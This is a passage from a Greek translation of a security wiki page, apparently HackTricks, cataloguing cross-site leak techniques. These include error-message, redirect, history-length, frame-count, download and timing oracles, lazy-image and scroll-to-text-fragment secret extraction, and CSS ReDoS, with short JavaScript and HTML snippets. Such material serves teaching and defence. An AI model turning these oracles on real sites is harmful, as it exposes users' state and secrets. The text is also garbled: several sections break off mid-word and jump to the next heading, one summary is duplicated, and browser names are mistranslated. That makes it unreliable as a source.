displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
Η ιδιότητα μηνύματος της διεπαφής `MediaError` αναγνωρίζει μοναδικά τους πόρους που φορτώνονται με επιτυχία με ένα διακριτό συμβολοσειριακό χαρακτήρα. Ένας επιτιθέμενος μπορεί να εκμεταλλευτεί αυτήν τη δυνατότητα παρατηρώντας το περιεχόμενο του μηνύματος, αποκαλύπτοντας έτσι την κατάσταση απόκρισης ενός πόρου διασυνοριακής προέλευσης.

### Σφάλμα CORS

* **Μέθοδοι Ενσωμάτωσης**: Fetch API
* **Ανιχνεύσιμη Διαφορά**: Κεφαλίδα
* **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Περίληψη**: Στις Δηλώσεις Ασφαλείας (SA), τα μηνύματα σφάλματος CORS αποκαλύπτουν ακούσια τον πλήρη URL των ανακατευθυνόμενων αιτημάτων.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Αυτή η τεχνική επιτρέπει σε έναν επιτιθέμενο να **εξάγει τον προορισμό μιας ανακατεύθυνσης διασυνοριακού ιστότοπου** εκμεταλλευόμενος τον τρόπο με τον οποίο οι περιηγητές βασισμένοι σε Webkit χειρίζονται τα αιτήματα CORS. Συγκεκριμένα, όταν στέλνεται ένα **αιτούμενο με CORS αίτημα** σε έναν στόχο που εκδίδει μια ανακατεύθυνση βάσει της κατάστασης του χρήστη και ο περιηγητής αρνείται στη συνέχεια το αίτημα, το **πλήρες URL του προορισμού της ανακατεύθυνσης αποκαλύπτεται** μέσα στο μήνυμα σφάλματος. Αυτή η ευπάθεια αποκαλύπτει όχι μόνο την ύπαρξη της ανακατεύθυνσης, αλλά και τον προορισμό της ανακατεύθυνσης και οποιεσδήποτε **ευαίσθητες παραμέτρους ερωτήματος** μπορεί να περιέχει.

### Σφάλμα SRI

* **Μέθοδοι Ενσωμάτωσης**: Fetch API
* **Ανιχνεύσιμη Διαφορά**: Κεφαλίδα
* **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Περίληψη**: Στις Δηλώσεις Ασφαλείας (SA), τα μηνύματα σφάλματος CORS αποκαλύπτουν ακούσια τον πλήρη URL των ανακατευθυνόμενων αιτημάτων.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Ένας επιτιθέμενος μπορεί να εκμεταλλευτεί τα **αναλυτικά μηνύματα σφάλματος** για να αποκαλύψει το μέγεθος των αποκρίσεων διασυνοριακής προέλευσης. Αυτό είναι δυνατό λόγω του μηχανισμού της Ακεραιότητας Υποπόρων Πόρων (SRI), ο οποίος χρησιμοποιεί το χαρακτηριστικό ακεραιότητας για να επαληθεύσει ότι οι πόροι που ανακτώνται, συχνά από CDNs, δεν έχουν παραβιαστεί. Για να λειτουργήσει το SRI σε πόρους διασυνοριακής προέλευσης, αυτοί πρέπει να είναι **CORS-enabled**· διαφορετικά, δεν υπόκεινται σε ελέγχους ακεραιότητας. Στις Δηλώσεις Ασφαλείας (SA), παρόμοια με το σφάλμα CORS XS-Leak, ένα μήνυμα σφάλματος μπορεί να καταγραφεί μετά από ένα αίτημα ανάκτησης με αποτυχία του χαρακτηριστικού ακεραιότητας. Οι επιτιθέμενοι μπορούν εσκεμμένα να **ενεργοποιήσουν αυτό το σφάλμα** αναθέτοντας μια **πλαστή τιμή κατακερματισμού** στο χαρακτη
### CORB

* **Μέθοδοι Ενσωμάτωσης**: Στοιχεία HTML
* **Ανιχνεύσιμη Διαφορά**: Κεφαλίδες
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Περίληψη**: Το CORB μπορεί να επιτρέψει στους επιτιθέμενους να ανιχνεύσουν όταν η αίτηση περιέχει την κεφαλίδα **`nosniff`**.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Ελέγξτε τον σύνδεσμο για περισσότερες πληροφορίες σχετικά με την επίθεση.

### Σφάλμα CORS στην Αντανάκλαση Προέλευσης λόγω Εσφαλμένης Διαμόρφωσης

* **Μέθοδοι Ενσωμάτωσης**: Fetch API
* **Ανιχνεύσιμη Διαφορά**: Κεφαλίδες
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Περίληψη**: Εάν η κεφαλίδα Origin αντανακλάται στην κεφαλίδα `Access-Control-Allow-Origin`, είναι δυνατόν να ελεγχθεί εάν ένας πόρος βρίσκεται ήδη στην προσωρινή μνήμη.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Στην περίπτωση που η κεφαλίδα Origin αντανακλάται στην κεφαλίδα `Access-Control-Allow-Origin`, ένας επιτιθέμενος μπορεί να εκμεταλλευτεί αυτήν τη συμπεριφορά για να προσπαθήσει να ανακτήσει τον πόρο σε λειτουργία CORS. Εάν δεν προκαλείται σφάλμα, σημαίνει ότι ο πόρος ανακτήθηκε σωστά από τον ιστό, ενώ εάν προκαλείται σφάλμα, σημαίνει ότι ανακτήθηκε από την προσωρινή μνήμη (το σφάλμα εμφανίζεται επειδή η προσωρινή μνήμη αποθηκεύει μια απόκριση με μια κεφαλίδα CORS που επιτρέπει τον αρχικό τομέα και όχι τον τομέα του επιτιθέμενου).\
Σημειώστε ότι εάν η προέλευση δεν αντανακλάται, αλλά χρησιμοποιείται ένας μπαλαντέρ (`Access-Control-Allow-Origin: *`), αυτό δεν θα λειτουργήσει.

## Τεχνική Αναγνώσιμων Χαρακτηριστικών

### Ανακατεύθυνση Fetch

* **Μέθοδοι Ενσωμάτωσης**: Fetch API
* **Ανιχνεύσιμη Διαφορά**: Κωδικός Κατάστασης
* **Περισσότερες πληροφορίες**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Περίληψη**: Οι GC και SA επιτρέπουν τον έλεγχο του τύπου απόκρισης (opaque-redirect) μετά την ολοκλήρωση της ανακατεύθυνσης.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Υποβάλλοντας μια αίτηση χρησιμοποιώντας το Fetch API με `redirect: "manual"` και άλλες παραμέτρους, είναι δυνατόν να διαβαστεί το χαρακτηριστικό `response.type` και εάν είναι ίσο με `opaqueredirect`, τότε η απόκριση ήταν μια ανακατεύθυνση.

### COOP

* **Μέθοδοι Ενσωμάτωσης**: Αναδυόμενα Παράθυρα
* **Ανιχνεύσιμη Διαφορά**: Κεφαλίδα
* **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Περίληψη**: Οι σελίδες που προστατε
### Μέγιστες Ανακατευθύνσεις

* **Μέθοδοι Ενσωμάτωσης**: Fetch API, Frames
* **Ανιχνεύσιμη Διαφορά**: Κωδικός Κατάστασης
* **Περισσότερες πληροφορίες**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Περίληψη:** Χρησιμοποιήστε το όριο ανακατεύθυνσης του προγράμματος περιήγησης για να διαπιστώσετε την εμφάνιση ανακατευθύνσεων URL.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Εάν ο **μέγιστος** αριθμός **ανακατευθύνσεων** που ακολουθεί ένας πρόγραμμα περιήγησης είναι **20**, ένας επιτιθέμενος μπορεί να προσπαθήσει να φορτώσει τη σελίδα του με **19 ανακατευθύνσεις** και τελικά να **αποστείλει το θύμα** στην δοκιμαζόμενη σελίδα. Εάν προκληθεί ένα **σφάλμα**, τότε η σελίδα προσπαθούσε να **ανακατευθύνει το θύμα**.

### Μήκος Ιστορικού

* **Μέθοδοι Ενσωμάτωσης**: Frames, Pop-ups
* **Ανιχνεύσιμη Διαφορά**: Ανακατευθύνσεις
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Περίληψη:** Ο κώδικας JavaScript παρεμβάλλει το ιστορικό περιήγησης του προγράμματος περιήγησης και μπορεί να αποκτηθεί μέσω της ιδιότητας μήκους.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

Η **Διεπαφή Ιστορικού** επιτρέπει στον κώδικα JavaScript να παρεμβάλλει το ιστορικό περιήγησης του προγράμματος περιήγησης, το οποίο **αποθηκεύει τις σελίδες που επισκέπτεται ένας χρήστης**. Ένας επιτιθέμενος μπορεί να χρησιμοποιήσει την ιδιότητα μήκους ως μέθοδο ενσωμάτωσης: για να ανιχνεύσει την πλοήγηση JavaScript και HTML.\
**Έλεγχος `history.length`**, καθιστώντας έναν χρήστη να **πλοηγηθεί** σε μια σελίδα, να την **αλλάξει** πίσω στην ίδια προέλευση και να **ελέγξει** τη νέα τιμή του **`history.length`**.

### Μήκος Ιστορικού με το ίδιο URL

* **Μέθοδοι Ενσωμάτωσης**: Frames, Pop-ups
* **Ανιχνεύσιμη Διαφορά**: Εάν το URL είναι το ίδιο με το μαντεμένο
* **Περίληψη:** Είναι δυνατό να μαντέψετε εάν η τοποθεσία ενός πλαισίου/αναδυόμενου παραθύρου βρίσκεται σε ένα συγκεκριμένο URL καταχρώντας το μήκος του ιστορικού.
* **Παράδειγμα Κώδικα**: Παρακάτω

Ένας επιτιθέμενος μπορεί να χρησιμοποιήσει κώδικα JavaScript για να **παρεμβάλλει την τοποθεσία του πλαισίου/αναδυόμενου παραθύρου σε ένα μαντεμένο** και **άμεσα να την αλλάξει σε `about:blank`**. Εάν το μήκος του ιστορικού αυξηθεί, σημαίνει ότι το URL ήταν σωστό και είχε χρόνο να **αυξηθεί επειδή το URL δεν φορτώνεται ξανά εάν είναι το ίδιο**. Εάν δεν αυξηθεί, σημαίνει ότι **προσπάθησε να φορτώσει το μαντεμένο URL** αλλά επειδή **άμεσα μετά** φορτώθηκε το **`about:blank`**, το **μήκος του ιστορικού δεν αυξήθηκε ποτέ** κατά τη φόρτωση του μαντεμένου URL.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Μέτρηση Καρέ

* **Μέθοδοι Ενσωμάτωσης**: Καρέ, Αναδυόμενα παράθυρα
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο σελίδας
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Περίληψη:** Αξιολογήστε την ποσότητα των στοιχείων iframe επιθεωρώντας την ιδιότητα `window.length`.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Η μέτρηση του **αριθμού των καρέ σε μια ιστοσελίδα** που ανοίγεται μέσω `iframe` ή `window.open` μπορεί να βοηθήσει στον προσδιορισμό της **κατάστασης του χρήστη σε αυτήν τη σελίδα**.\
Επιπλέον, αν η σελίδα έχει πάντα τον ίδιο αριθμό καρέ, ο έλεγχος **συνεχώς** του αριθμού των καρέ μπορεί να βοηθήσει στον προσδιορισμό ενός **μοτίβου** που μπορεί να διαρρεύσει πληροφορίες.

Ένα παράδειγμα αυτής της τεχνικής είναι ότι στο Chrome, ένα **PDF** μπορεί να ανιχνευθεί με τη **μέτρηση καρέ** επειδή χρησιμοποιείται εσωτερικά ένα `embed`. Υπάρχουν [Παράμετροι Ανοίγματος URL](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) που επιτρέπουν κάποιον έλεγχο του περιεχομένου, όπως `zoom`, `view`, `page`, `toolbar`, όπου αυτή η τεχνική μπορεί να είναι ενδιαφέρουσα.

### Στοιχεία HTMLElements

* **Μέθοδοι Ενσωμάτωσης**: Στοιχεία HTML
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο σελίδας
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Περίληψη:** Διαβάστε τη διαρρεύσασα τιμή για να διακρίνετε ανάμεσα σε 2 πιθανές καταστάσεις
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Η διαρροή πληροφοριών μέσω στοιχείων HTML αποτελεί ανησυχία στην ασφάλεια του web, ιδιαίτερα όταν δημιουργούνται δυναμικά αρχεία πολυμέσων βάσει πληροφοριών του χρήστη ή όταν προστίθενται υδατογραφήματα που αλλάζουν το μέγεθος των πολυμέσων. Αυτό μπορεί να εκμεταλλευτεί από επιτιθέμενους για να διακρίνουν ανάμεσα σε πιθανές καταστάσεις αναλύοντας τις πληροφορίες που αποκαλύπτονται από συγκεκριμένα στοιχεία HTML.

### Πληροφορίες που Αποκαλύπτονται από Στοιχεία HTML

- **HTMLMediaElement**: Αυτό το στοιχείο αποκαλύπτει τον χρόνο `διάρκειας` και `buffered` του πολυμέσου, τα οποία μπορούν να αποκτηθούν μέσω της διεπαφής του.
[Διαβάστε περισσότερα για το HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement**: Αποκαλύπτει το `videoHeight` και `videoWidth`. Σε ορισμένους περιηγητές, είναι διαθέσιμες επιπλέον ιδιότητες όπως `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` και `webkitDecodedFrameCount`, προσφέροντας περισσότερες λεπτομέρειες για το περιεχόμενο των πολυμέσων.
[Διαβάστε περισσότερα για το HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**: Αυτή η συνάρτηση παρέχει λεπτομέρειες σχετικά με την ποιότητα αναπαραγωγής του βίντεο, συμπεριλαμβανομένου του `totalVideoFrames`, το οποίο μπορεί να υποδείξει τον αριθμό των δεδομένων βίντεο που έχουν επεξεργαστεί.
[Διαβάστε περισσότερα για το getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**: Αυτό το στοιχείο διαρρέει το `ύψος` και το `πλάτος` μιας
### Ροή Αποκάλυψης X-Frame του ContentDocument

* **Μέθοδοι Ενσωμάτωσης**: Frames
* **Ανιχνεύσιμη Διαφορά**: Κεφαλίδες
* **Περισσότερες πληροφορίες**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Περίληψη**: Στον Google Chrome, εμφανίζεται μια αφιερωμένη σελίδα σφάλματος όταν μια σελίδα αποκλείεται από το να ενσωματωθεί σε μια ιστοσελίδα διαφορετικής προέλευσης λόγω περιορισμών X-Frame-Options.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Στον Chrome, εάν μια σελίδα με την κεφαλίδα `X-Frame-Options` που έχει οριστεί σε "deny" ή "same-origin" ενσωματωθεί ως αντικείμενο, εμφανίζεται μια σελίδα σφάλματος. Ο Chrome επιστρέφει μια κενή αντικείμενο εγγράφου (αντί για `null`) για την ιδιότητα `contentDocument` αυτού του αντικειμένου, αντίθετα από τα iframes ή άλλους περιηγητές. Οι επιτιθέμενοι μπορούν να εκμεταλλευτούν αυτό εντοπίζοντας το κενό έγγραφο και αποκαλύπτοντας πιθανώς πληροφορίες σχετικά με την κατάσταση του χρήστη, ειδικά εάν οι προγραμματιστές ορίζουν αναποτελεσματικά την κεφαλίδα X-Frame-Options, παραβλέποντας συχνά τις σελίδες σφάλματος. Η ενημέρωση και η συνεπής εφαρμογή των κεφαλίδων ασφαλείας είναι ζωτικής σημασίας για την πρόληψη τέτοιων διαρροών.


### Ανίχνευση Λήψης

* **Μέθοδοι Ενσωμάτωσης**: Frames, Pop-ups
* **Ανιχνεύσιμη Διαφορά**: Κεφαλίδες
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Περίληψη**: Ένας επιτιθέμενος μπορεί να διακρίνει τις λήψεις αρχείων εκμεταλλευόμενος τα iframes· η συνεχής προσβασιμότητα του iframe υποδηλώνει επιτυχημένη λήψη αρχείου.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

Η κεφαλίδα `Content-Disposition`, ειδικότερα `Content-Disposition: attachment`, οδηγεί τον περιηγητή να κατεβάσει το περιεχόμενο αντί να το εμφανίσει ενσωματωμένο. Αυτή η συμπεριφορά μπορεί να εκμεταλλευτεί για να ανιχνευθεί εάν ένας χρήστης έχει πρόσβαση σε μια σελίδα που ενεργοποιεί μια λήψη αρχείου. Στους περιηγητές που βασίζονται στο Chromium, υπάρχουν μερικές τεχνικές για να ανιχνευθεί αυτή η συμπεριφορά λήψης:

1. **Παρακολούθηση Γραμμής Λήψης**:
- Όταν ένα αρχείο κατεβάζεται σε περιηγητές που βασίζονται στο Chromium, εμφανίζεται μια γραμμή λήψης στο κάτω μέρος του παράθυρου του περιηγητή.
- Με την παρακολούθηση των αλλαγών στο ύψος του παραθύρου, οι επιτιθέμενοι μπορούν να συμπεράνουν την εμφάνιση της γραμμής λήψης, υποδηλώνοντας ότι έχει ξεκινήσει μια λήψη.

2. **Πλοήγηση Λήψης με Iframes**:
- Όταν μια σελίδα ενεργοποιεί μια λήψη αρχείου χρησιμοποιώντας την κεφαλίδα `Content-Disposition: attachment`, δεν προκαλείται μια γεγονότα πλοήγησης.
- Φορτώνοντας το περιεχόμενο σε ένα iframe και παρακολουθώντας τα γεγονότα πλοήγησης, είναι δυνατόν να ελεγχθεί εάν η κατάσταση του περιεχομένου προκα
### Ρύπανση Σεναρίου

* **Μέθοδοι Ενσωμάτωσης**: Στοιχεία HTML (script)
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Περίληψη:** Είναι δυνατόν να **αντικατασταθούν ενσωματωμένες συναρτήσεις** και να διαβαστούν οι παράμετροί τους από ένα **σενάριο διαφορετικής προέλευσης** (το οποίο δεν μπορεί να διαβαστεί απευθείας), αυτό μπορεί να **διαρρεύσει πολύτιμες πληροφορίες**.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Εργαζόμενοι Υπηρεσίας <a href="#service-workers" id="service-workers"></a>

* **Μέθοδοι Ενσωμάτωσης**: Αναδυόμενα παράθυρα
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Περίληψη:** Μέτρηση χρόνου εκτέλεσης μιας ιστοσελίδας χρησιμοποιώντας εργαζόμενους υπηρεσίας.
* **Παράδειγμα Κώδικα**:

Στο συγκεκριμένο σενάριο, ο επιτιθέμενος πρωτοβουλείται να καταχωρήσει έναν **εργαζόμενο υπηρεσίας** σε έναν από τους τομείς τους, συγκεκριμένα "attacker.com". Στη συνέχεια, ο επιτιθέμενος ανοίγει ένα νέο παράθυρο στην ιστοσελίδα-στόχο από τον κύριο έγγραφο και εντολοδοτεί τον **εργαζόμενο υπηρεσίας** να ξεκινήσει ένα χρονόμετρο. Καθώς το νέο παράθυρο αρχίζει να φορτώνεται, ο επιτιθέμενος πλοηγείται στην αναφορά που έχει λάβει στο προηγούμενο βήμα σε μια σελίδα που διαχειρίζεται ο **εργαζόμενος υπηρεσίας**.

Με την άφιξη του αιτήματος που ξεκίνησε στο προηγούμενο βήμα, ο **εργαζόμενος υπηρεσίας** απαντά με έναν κωδικό κατάστασης **204 (No Content)**, τερματίζοντας αποτελεσματικά τη διαδικασία πλοήγησης. Σε αυτό το σημείο, ο **εργαζόμενος υπηρεσίας** καταγράφει μια μέτρηση από το χρονόμετρο που ξεκίνησε νωρίτερα στο δεύτερο βήμα. Αυτή η μέτρηση επηρεάζεται από τη διάρκεια του JavaScript που προκαλεί καθυστερήσεις στη διαδικασία πλοήγησης.

{% hint style="warning" %}
Σε μια χρονομέτρηση εκτέλεσης είναι δυνατόν να **εξαλειφθούν** **παράγοντες δικτύου** για να ληφθούν **πιο ακριβείς μετρήσεις**. Για παράδειγμα, φορτώνοντας τους πόρους που χρησιμοποιούνται από τη σελίδα πριν από τη φόρτωσή της.
{% endhint %}

### Χρονομέτρηση Fetch

* **Μέθοδοι Ενσωμάτωσης**: Fetch API
* **Ανιχνεύσιμη Διαφορά**: Χρονομέτρηση (συνήθως λόγω Περιεχομένου Σελίδας, Κωδικού Κατάστασης)
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Περίληψη:** Χρησιμοποιήστε την [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) για να μετρήσετε τον χρόνο που απαιτείται για να πραγματοποιηθεί ένα αίτημα. Μπορούν να χρησιμοποιηθούν και άλλα ρολόγια.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Χρονομέτρηση Διασταυρούμενου Παραθύρου

* **Μέθοδοι Ενσωμάτωσης**: Αναδυόμενα παράθυρα
* **Ανιχνεύσιμη Διαφορά**: Χρονομέτρηση (συνήθως λόγω Περιεχομένου Σελίδας, Κωδικού Κατάστασης)
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Περίληψη:** Χρησιμοποιήστε την [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) για να μετρήσετε τον χρόνο που απαιτείται για να πραγματοποιηθεί ένα αίτημα χρησιμοποιώντας το `window.open`. Μπορούν να χρησιμοποιηθούν και άλλα ρολόγια.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρ
```html
<img src=/something loading=lazy >
```
Επομένως, αυτό που μπορείτε να κάνετε είναι να **προσθέσετε πολλούς αχρήστους χαρακτήρες** (Για παράδειγμα, **χιλιάδες "W"**) για να **γεμίσετε την ιστοσελίδα πριν το μυστικό ή να προσθέσετε κάτι σαν** `<br><canvas height="1850px"></canvas><br>.`\
Έτσι, αν για παράδειγμα η **εισαγωγή μας εμφανίζεται πριν τη σημαία**, η **εικόνα** θα **φορτωθεί**, αλλά αν εμφανιστεί **μετά** τη **σημαία**, η σημαία + οι αχρήστοι χαρακτήρες θα **την εμποδίσουν να φορτωθεί** (θα πρέπει να πειραματιστείτε με το πόσους αχρήστους χαρακτήρες να τοποθετήσετε). Αυτό συνέβη σε [**αυτήν την ανάρτηση**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Μια άλλη επιλογή θα ήταν να χρησιμοποιήσετε το **scroll-to-text-fragment** αν επιτρέπεται:

#### Scroll-to-text-fragment

Ωστόσο, κάνετε το **ρομπότ να έχει πρόσβαση στη σελίδα** με κάτι σαν το παρακάτω:
```
#:~:text=SECR
```
Έτσι η ιστοσελίδα θα είναι κάτι σαν: **`https://victim.com/post.html#:~:text=SECR`**

Όπου το post.html περιέχει τους κακόβουλους χαρακτήρες του επιτιθέμενου και μια εικόνα φόρτωσης με αργή φόρτωση και στη συνέχεια προστίθεται το μυστικό του bot.

Αυτό που θα κάνει αυτό το κείμενο είναι να κάνει το bot να έχει πρόσβαση σε οποιοδήποτε κείμενο στη σελίδα που περιέχει το κείμενο `SECR`. Καθώς αυτό το κείμενο είναι το μυστικό και βρίσκεται **κάτω από την εικόνα**, η **εικόνα θα φορτωθεί μόνο αν το μυστικό που μαντέψαμε είναι σωστό**. Έτσι έχετε τον oracle σας για να **αποκτήσετε πρόσβαση στο μυστικό χαρακτήρα-χαρακτήρα**.

Ορισμένα παραδείγματα κώδικα για να εκμεταλλευτείτε αυτό: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Χρονομετρημένη Φόρτωση Εικόνας με Αργή Φόρτωση

Αν δεν είναι δυνατή η φόρτωση μιας εξωτερικής εικόνας που θα μπορούσε να υποδείξει στον επιτιθέμενο ότι η εικόνα φορτώθηκε, μια άλλη επιλογή θα ήταν να προσπαθήσετε να μαντέψετε τον χαρακτήρα αρκετές φορές και να το μετρήσετε. Αν η εικόνα φορτώνεται, όλα τα αιτήματα θα διαρκούν περισσότερο από ό,τι αν η εικόνα δεν φορτώνεται. Αυτό είναι αυτό που χρησιμοποιήθηκε στη [**λύση αυτού του writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **που περιλαμβάνεται εδώ:**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Αν χρησιμοποιείται το `jQuery(location.hash)`, είναι δυνατό να ανακαλυφθεί μέσω της χρονομέτρησης αν κάποιο περιεχόμενο HTML υπάρχει, αυτό γίνεται επειδή αν ο επιλογέας `main[id='site-main']` δεν ταιριάζει δεν χρειάζεται να ελεγχθούν τα υπόλοιπα **επιλογείς**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### Εισαγωγή CSS

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## Αμυντικά μέτρα

Υπάρχουν προτεινόμενες αντιμετωπίσεις στο [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) επίσης σε κάθε ενότητα του wiki [https://xsleaks.dev/](https://xsleaks.dev/). Ρίξτε μια ματιά εκεί για περισσότερες πληροφορίες σχετικά με το πώς να προστατευτείτε από αυτές τις τεχνικές.

## Αναφορές

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

